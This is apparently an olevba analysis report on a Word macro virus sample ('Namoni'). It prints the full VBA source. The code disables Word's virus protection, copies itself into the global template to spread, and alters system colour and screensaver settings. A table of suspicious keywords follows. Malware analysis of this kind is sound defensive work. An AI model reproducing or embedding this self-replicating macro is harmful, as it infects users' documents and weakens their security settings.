olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Inamo.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Inamo.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO FileSaveAs.bas 
in file: Virus.MSWord.Inamo.a - OLE stream: 'Macros/VBA/FileSaveAs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Attribute AutoOpen.VB_Description = "Macro virus Namoni"
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Project.Namoni.AutoOpen"
'Virus Namoni
'Escrito por Brasileiro
'Brasil 2004
On Error Resume Next
With Options
        .ConfirmConversions = False
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
    
With Selection
    .InsertBefore "Boa sorte"
    .ParagraphFormat.Alignment = wdAlignParagraphCenter
    .InsertParagraphAfter
    .Font.Size = 14
    .Font.Color = wdColorBlue
'It adds word Good Luck ( Boa sorte) in the document infected

End With
    
iMacroCount = WordBasic.CountMacros(0, 0)
'Namoni
For i = 1 To iMacroCount
    If WordBasic.[MacroName$](i, 0, 0) = "Namoni" Then
        binstalled = -1
    End If
    If WordBasic.[MacroName$](i, 0, 0) = "FileSaveAs" Then
        bTooMuchTrouble = -1
    End If
Next i
If Not binstalled And Not bTooMuchTrouble Then
    'add FileSaveAs and copies of FileSaveAs and AutoClose
    'Namoni Virus
    sMe$ = WordBasic.[FileName$]()
    sMacro$ = sMe$ + ":Namoni"
    WordBasic.MacroCopy sMacro$, "Global:FileSaveAs"
    sMacro$ = sMe$ + ":AutoClose"
    WordBasic.MacroCopy sMacro$, "Global:Namoni" 'Infected document word from the Global Template
    
End If
Namoni:
End Sub

Sub ToolsMacro()
Attribute ToolsMacro.VB_Description = "Macro virus Namoni"
Attribute ToolsMacro.VB_ProcData.VB_Invoke_Func = "Project.Namoni.Macro"
    On Error Resume Next
    Application.DisplayStatusBar = False  'Disable Tools macro
    
End Sub

Sub AutoClose()
Attribute AutoClose.VB_Description = "Macro virus Namoni "
Attribute AutoClose.VB_ProcData.VB_Invoke_Func = "Project.Namoni.AutoClose"
    
On Error Resume Next
WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "Scrollbar", "255 255 0", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "Background", "255 255 0", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "ActiveTitle", "89 151 100", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "InactiveTitle", "128 128 0", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "Menu", "255 255 0", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "Window", "255 255 0", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "WindowFrame", "0 0 0", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "MenuText", "0 0 0", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "TitleText", "255 255 255", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "ActiveBorder", "162 200 169", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "InactiveBorder", "162 200 169", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "AppWorkspace", "150 192 157", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "Hilight", "89 151 100", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "HilightText", "0 0 0", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "ButtonFace", "255 255 0", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "ButtonShadow", "89 151 100", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "GrayText", "89 151 100", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "ButtonText", "0 0 0", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "InactiveTitleText", "0 0 0", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "ButtonHilight", "208 227 211", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "ButtonDkShadow", "0 0 0", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "ButtonLight", "255 255 0", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "InfoText", "255 255 0", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "InfoWindow", "0 0 0", ""
    WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "ButtonAlternateFace", "255 255 0", ""

    WordBasic.SetPrivateProfileString "Boot", "SCRNSAVE.EXE", "C:\WINDOWS\SYSTEM\SCROLL~1.SCR", "C:\WINDOWS\SYSTEM.INI"

     'Changes windows desktop colors to Yellow

ActiveDocument.SaveAs FileName:="C:\Windows\Desktop\Leia.doc"
With Assistant.NewBalloon
 .BalloonType = msoBalloonTypeButtons
 .Icon = msoIconAlertWarning
 .Heading = "Ola amigo!"
 .Text = "Namoni foi ativado"
 .Button = msoButtonSetOK
 .Show
End With


MsgBox " Sair agora "

End Sub




+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|SYSTEM              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |SCRNSAVE.EXE        |Executable file name                         |
|IOC       |1.SCR               |Executable file name                         |
+----------+--------------------+---------------------------------------------+

